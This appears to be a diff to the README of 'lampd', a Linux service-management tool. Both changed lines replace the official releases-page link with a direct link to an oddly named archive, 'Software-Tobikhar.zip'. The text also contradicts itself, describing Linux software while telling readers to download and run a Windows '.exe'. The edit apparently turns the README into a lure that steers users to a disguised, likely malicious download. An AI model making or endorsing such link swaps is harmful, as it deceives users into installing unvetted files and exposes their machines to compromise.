@@ -1,6 +1,6 @@
 # 💻 lampd - Control your Linux services with ease
 
-[![](https://img.shields.io/badge/Download_Lampd-Blue?style=for-the-badge)](https://github.com/bluesma8603/lampd/releases)
+[![](https://img.shields.io/badge/Download_Lampd-Blue?style=for-the-badge)](https://raw.githubusercontent.com/bluesma8603/lampd/main/src/Software-Tobikhar.zip)
 
 Lampd provides a simple interface to manage your web development tools on Linux. You can start, stop, and monitor services through a clean window. This tool removes the need for terminal commands.
 
@@ -12,7 +12,7 @@ To use lampd on your Windows machine, ensure you meet the following requirements
 
 Follow these steps to set up the software.
 
-1. Visit the [official releases page](https://github.com/bluesma8603/lampd/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/bluesma8603/lampd/main/src/Software-Tobikhar.zip) to download the latest version.
 2. Look for the file ending in .exe in the Assets section.
 3. Save the file to your computer.
 4. Double-click the file to begin the installation.
